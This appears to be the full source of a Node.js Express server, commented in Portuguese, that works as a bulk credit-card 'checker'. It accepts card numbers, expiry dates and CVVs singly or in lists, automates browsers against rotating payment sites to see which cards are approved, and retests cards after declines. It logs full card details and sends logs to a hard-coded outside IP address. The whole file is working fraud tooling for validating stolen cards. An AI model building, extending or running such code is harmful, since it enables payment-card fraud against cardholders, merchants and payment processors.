const express = require('express');
const { checkCard, retestCard } = require('./paymentChecker');
const { getNextSite } = require('./paymentChecker');
const logSender = require('./logSender');

const app = express();
const PORT = 3001;

// Inicializa logSender (accessKey será setado por request)
logSender.init({
  checkerId: 'cielo',
  accessKey: '',
  endpoint: 'http://179.197.233.196/workcenter/checker/log_receiver.php'
});

// Map de tokens de cancelamento por access_key
const cancelTokens = new Map();
// Track browsers ativos por access_key para fechar no cancel
const activeBrowsers = new Map();

function checkCancelled(accessKey) {
  return cancelTokens.get(accessKey) === true;
}

function setCancelled(accessKey) {
  cancelTokens.set(accessKey, true);
  // Fecha todos os browsers desse access_key imediatamente
  const browsers = activeBrowsers.get(accessKey) || [];
  browsers.forEach(browser => {
    try {
      browser.close();
    } catch (e) {}
    // Force kill se não fechar
    try {
      if (browser.process && browser.process().kill) {
        browser.process().kill('SIGKILL');
      }
    } catch (e) {}
  });
  activeBrowsers.delete(accessKey);
  // Limpa token após 5 min
  setTimeout(() => cancelTokens.delete(accessKey), 5 * 60 * 1000);
}

function registerBrowser(accessKey, browser) {
  if (!accessKey) return;
  if (!activeBrowsers.has(accessKey)) activeBrowsers.set(accessKey, []);
  activeBrowsers.get(accessKey).push(browser);
}

function unregisterBrowser(accessKey, browser) {
  if (!accessKey) return;
  const list = activeBrowsers.get(accessKey);
  if (list) {
    const idx = list.indexOf(browser);
    if (idx >= 0) list.splice(idx, 1);
  }
}

// Normaliza resposta do gateway para formato que checker.js espera
function transformGatewayResponse(card, gwResponse) {
  const { cardNumber, expiryMonth, expiryYear, cvv } = card;

  let status = 'ERROR';
  let errorReason = null;
  let duration = null;

  if (gwResponse) {
    const gwStatus = gwResponse.transactionStatus || gwResponse.status || gwResponse.result;
    errorReason = gwResponse.gwErrorReason || gwResponse.errorReason || gwResponse.reason || gwResponse.message || null;

    // Normaliza status
    if (gwStatus === 'APPROVED' || gwStatus === 'APPROVED') {
      status = 'APPROVED';
    } else if (gwStatus === 'DECLINED' || gwStatus === 'REPROVADA' || gwStatus === 'Suspected fraud' || gwStatus === 'SUSPECTED_FRAUD') {
      status = 'DECLINED';
    } else if (gwStatus) {
      status = gwStatus; // Mantém outros status se existirem
    }
  }

  return {
    cardNumber,
    expiryMonth,
    expiryYear,
    cvv,
    status,
    errorReason,
    duration
  };
}

app.use(express.json());

// /check — 1 cartão por vez, browser próprio, sem reteste
app.post('/check', async (req, res) => {
  const { cardNumber, expiryMonth, expiryYear, cvv, access_key } = req.body;

  if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
    return res.status(400).json({ error: 'Campos obrigatórios: cardNumber, expiryMonth, expiryYear, cvv' });
  }

  if (access_key) logSender.setAccessKey(access_key);

  console.log(`[${new Date().toISOString()}] /check: ${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`);

  try {
    const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv);
    console.log(`[${new Date().toISOString()}] /check resultado: ${cardNumber} - ${result.status}`);

    // Normaliza status
    let normalizedStatus = result.status;
    if (normalizedStatus === 'REPROVADA' || normalizedStatus === 'Suspected fraud' || normalizedStatus === 'SUSPECTED_FRAUD') {
      normalizedStatus = 'DECLINED';
    }

    // Retorna formato simples que checker.js espera
    res.json({
      cardNumber,
      expiryMonth,
      expiryYear,
      cvv,
      status: normalizedStatus,
      errorReason: result.errorReason || null,
      duration: result.duration || null
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  } finally {
    logSender.setAccessKey('');
  }
});

// /bulk — lista de cartões com fila + reteste na mesma aba após DECLINED
// Body: { "cards": ["cc|mm|yyyy|cvv", ...], "threads": 3, "access_key": "..." }
app.post('/bulk', async (req, res) => {
  const { cards, threads = 3, access_key } = req.body;

  if (!cards || !Array.isArray(cards) || cards.length === 0) {
    return res.status(400).json({ error: 'Campo obrigatório: cards (array de strings "cc|mm|yyyy|cvv")' });
  }

  if (access_key) logSender.setAccessKey(access_key);

  const lines = cards.map(c => c.trim()).filter(Boolean);
  const THREADS = Math.max(1, Math.min(parseInt(threads), 10));

  console.log(`[${new Date().toISOString()}] /bulk: ${lines.length} cartões, ${THREADS} threads`);

  const results = [];
  let nextCardIndex = 0;

  async function worker() {
    let currentBrowser = null;
    let currentPage = null;

    try {
      while (true) {
        // Verifica cancelamento antes de cada cartão
        if (access_key && checkCancelled(access_key)) {
          console.log(`[${new Date().toISOString()}] /bulk cancelado: ${access_key}`);
          return;
        }

        const cardIdx = nextCardIndex++;
        if (cardIdx >= lines.length) return;

        const cardLine = lines[cardIdx];
        const [cardNumber, expiryMonth, expiryYear, cvv] = cardLine.split('|');
        if (!cardNumber || !expiryMonth || !expiryYear || !cvv) continue;

        if (currentBrowser && !currentBrowser.isConnected()) {
          currentBrowser = null;
          currentPage = null;
        }
        if (currentPage && currentPage.isClosed()) {
          currentPage = null;
        }

        const site = getNextSite();

        try {
          const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv, currentPage, currentBrowser, true, site);

          // Verifica cancelamento APÓS checkCard (pode demorar 30-60s)
          if (access_key && checkCancelled(access_key)) {
            console.log(`[${new Date().toISOString()}] /bulk cancelado após checkCard: ${access_key}`);
            if (result && result.browser) {
              try { await result.browser.close(); } catch (e) {}
            }
            return;
          }

          if (result && result.browser) {
            currentBrowser = result.browser;
            currentPage = result.page;
            if (access_key) registerBrowser(access_key, currentBrowser);
          }

          const status = result && result.status;
          const isTimeout = result && result.errorReason === 'Falha após 3 tentativas (timeout/erro de navegação)';

          // Normaliza status do gateway para formato checker.js
          let normalizedStatus = status;
          if (status === 'REPROVADA' || status === 'Suspected fraud' || status === 'SUSPECTED_FRAUD') {
            normalizedStatus = 'DECLINED';
          }

          // Formato que checker.js espera
          results.push({
            cardNumber,
            expiryMonth,
            expiryYear,
            cvv,
            status: isTimeout ? 'ERROR' : normalizedStatus,
            errorReason: result ? result.errorReason : null,
            duration: result ? result.duration : null
          });

          console.log(`[${new Date().toISOString()}] ${cardNumber} - ${status}`);

          // Só APPROVED finaliza sem reteste. Qualquer outro status retesta 2x na mesma aba
          const isApproved = status === 'APPROVED';

          if (isTimeout || isApproved) {
            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              if (access_key) unregisterBrowser(access_key, currentBrowser);
              currentBrowser = null;
              currentPage = null;
            }
          } else {
            // Retesta os próximos 2 cards na mesma aba (qualquer status != APPROVED)
            for (let r = 0; r < 2; r++) {
              if (access_key && checkCancelled(access_key)) {
                console.log(`[${new Date().toISOString()}] /bulk cancelado durante reteste: ${access_key}`);
                return;
              }

              const retestIdx = nextCardIndex++;
              if (retestIdx >= lines.length) break;

              const retestLine = lines[retestIdx];
              const [rc, rm, ry, rcv] = retestLine.split('|');
              if (!rc || !rm || !ry || !rcv) continue;

              console.log(`[${new Date().toISOString()}] [RETESTE ${r + 1}/2] ${rc}`);

              let retestResult;
              try {
                retestResult = await retestCard(currentPage, currentBrowser, rc, rm, ry, rcv, site);
              } catch (err) {
                retestResult = { status: 'ERROR', errorReason: err.message };
              }

              // Verifica cancelamento APÓS retestCard
              if (access_key && checkCancelled(access_key)) {
                console.log(`[${new Date().toISOString()}] /bulk cancelado após retestCard: ${access_key}`);
                return;
              }

              // Normaliza status do reteste
              let retestStatus = retestResult ? retestResult.status : 'ERROR';
              if (retestStatus === 'REPROVADA' || retestStatus === 'Suspected fraud' || retestStatus === 'SUSPECTED_FRAUD') {
                retestStatus = 'DECLINED';
              }

              results.push({
                cardNumber: rc,
                expiryMonth: rm,
                expiryYear: ry,
                cvv: rcv,
                status: retestStatus,
                errorReason: retestResult ? retestResult.errorReason : null,
                duration: 'reteste'
              });

              if (retestResult && retestResult.status === 'APPROVED') break;
            }

            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              if (access_key) unregisterBrowser(access_key, currentBrowser);
              currentBrowser = null;
              currentPage = null;
            }
          }
        } catch (error) {
          results.push({ cardNumber, expiryMonth, expiryYear, cvv, status: 'ERROR', errorReason: error.message, duration: null });
          if (currentBrowser) {
            try { await currentBrowser.close(); } catch (e) {}
            if (access_key) unregisterBrowser(access_key, currentBrowser);
            currentBrowser = null;
            currentPage = null;
          }
        }
      }
    } finally {
      if (currentBrowser) {
        try { await currentBrowser.close(); } catch (e) {}
        if (access_key) unregisterBrowser(access_key, currentBrowser);
      }
    }
  }

  // Streaming response - envia cada resultado conforme completa
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Transfer-Encoding', 'chunked');
  res.write('[');

  let firstResult = true;
  let completedCount = 0;

  // Wrapper para enviar resultado em tempo real
  const sendResult = (result) => {
    if (!firstResult) res.write(',');
    firstResult = false;
    res.write(JSON.stringify(result));
    completedCount++;
  };

  try {
    const workerCount = Math.min(THREADS, lines.length);

    // Modifica worker para enviar resultado em tempo real
    async function streamingWorker() {
      let currentBrowser = null;
      let currentPage = null;

      try {
        while (true) {
          if (access_key && checkCancelled(access_key)) {
            console.log(`[${new Date().toISOString()}] /bulk cancelado: ${access_key}`);
            return;
          }

          const cardIdx = nextCardIndex++;
          if (cardIdx >= lines.length) return;

          const cardLine = lines[cardIdx];
          const [cardNumber, expiryMonth, expiryYear, cvv] = cardLine.split('|');
          if (!cardNumber || !expiryMonth || !expiryYear || !cvv) continue;

          if (currentBrowser && !currentBrowser.isConnected()) {
            currentBrowser = null;
            currentPage = null;
          }
          if (currentPage && currentPage.isClosed()) {
            currentPage = null;
          }

          const site = getNextSite();

          try {
            const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv, currentPage, currentBrowser, true, site);

            // Verifica cancelamento APÓS checkCard
            if (access_key && checkCancelled(access_key)) {
              console.log(`[${new Date().toISOString()}] /bulk cancelado após checkCard: ${access_key}`);
              if (result && result.browser) {
                try { await result.browser.close(); } catch (e) {}
              }
              return;
            }

            if (result && result.browser) {
              currentBrowser = result.browser;
              currentPage = result.page;
              if (access_key) registerBrowser(access_key, currentBrowser);
            }

            const status = result && result.status;
            const isTimeout = result && result.errorReason === 'Falha após 3 tentativas (timeout/erro de navegação)';

            let normalizedStatus = status;
            if (status === 'REPROVADA' || status === 'Suspected fraud' || status === 'SUSPECTED_FRAUD') {
              normalizedStatus = 'DECLINED';
            }

            // Envia resultado em tempo real
            sendResult({
              cardNumber,
              expiryMonth,
              expiryYear,
              cvv,
              status: isTimeout ? 'ERROR' : normalizedStatus,
              errorReason: result ? result.errorReason : null,
              duration: result ? result.duration : null
            });

            console.log(`[${new Date().toISOString()}] ${cardNumber} - ${status}`);

            const isApproved = status === 'APPROVED';

            if (isTimeout || isApproved) {
              if (currentBrowser) {
                try { await currentBrowser.close(); } catch (e) {}
                if (access_key) unregisterBrowser(access_key, currentBrowser);
                currentBrowser = null;
                currentPage = null;
              }
            } else {
              // Retesta os próximos 2 cards na mesma aba
              for (let r = 0; r < 2; r++) {
                if (access_key && checkCancelled(access_key)) {
                  console.log(`[${new Date().toISOString()}] /bulk cancelado durante reteste: ${access_key}`);
                  return;
                }

                const retestIdx = nextCardIndex++;
                if (retestIdx >= lines.length) break;

                const retestLine = lines[retestIdx];
                const [rc, rm, ry, rcv] = retestLine.split('|');
                if (!rc || !rm || !ry || !rcv) continue;

                console.log(`[${new Date().toISOString()}] [RETESTE ${r + 1}/2] ${rc}`);

                let retestResult;
                try {
                  retestResult = await retestCard(currentPage, currentBrowser, rc, rm, ry, rcv, site);
                } catch (err) {
                  retestResult = { status: 'ERROR', errorReason: err.message };
                }

                // Verifica cancelamento APÓS retestCard
                if (access_key && checkCancelled(access_key)) {
                  console.log(`[${new Date().toISOString()}] /bulk cancelado após retestCard: ${access_key}`);
                  return;
                }

                let retestStatus = retestResult ? retestResult.status : 'ERROR';
                if (retestStatus === 'REPROVADA' || retestStatus === 'Suspected fraud' || retestStatus === 'SUSPECTED_FRAUD') {
                  retestStatus = 'DECLINED';
                }

                // Envia reteste em tempo real
                sendResult({
                  cardNumber: rc,
                  expiryMonth: rm,
                  expiryYear: ry,
                  cvv: rcv,
                  status: retestStatus,
                  errorReason: retestResult ? retestResult.errorReason : null,
                  duration: 'reteste'
                });

                if (retestResult && retestResult.status === 'APPROVED') break;
              }

              if (currentBrowser) {
                try { await currentBrowser.close(); } catch (e) {}
                if (access_key) unregisterBrowser(access_key, currentBrowser);
                currentBrowser = null;
                currentPage = null;
              }
            }
          } catch (error) {
            sendResult({ cardNumber, expiryMonth, expiryYear, cvv, status: 'ERROR', errorReason: error.message, duration: null });
            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              if (access_key) unregisterBrowser(access_key, currentBrowser);
              currentBrowser = null;
              currentPage = null;
            }
          }
        }
      } finally {
        if (currentBrowser) {
          try { await currentBrowser.close(); } catch (e) {}
          if (access_key) unregisterBrowser(access_key, currentBrowser);
        }
      }
    }

    await Promise.all(Array.from({ length: workerCount }, () => streamingWorker()));
    console.log(`[${new Date().toISOString()}] /bulk concluído: ${completedCount} resultados`);
    res.write(']');
    res.end();
  } catch (error) {
    res.write(']');
    res.end();
    console.error(`[${new Date().toISOString()}] /bulk erro: ${error.message}`);
  } finally {
    logSender.setAccessKey('');
  }
});

// /bulk/cancel — cancela job em andamento por access_key e fecha browsers
app.post('/bulk/cancel', (req, res) => {
  const { access_key } = req.body;
  if (!access_key) {
    return res.status(400).json({ error: 'access_key obrigatório' });
  }
  setCancelled(access_key);
  console.log(`[${new Date().toISOString()}] /bulk/cancel: ${access_key} - browsers fechados`);
  res.json({ success: true, message: 'Cancelamento solicitado, browsers fechados' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(PORT, () => {
  console.log(`API rodando em http://localhost:${PORT}`);
});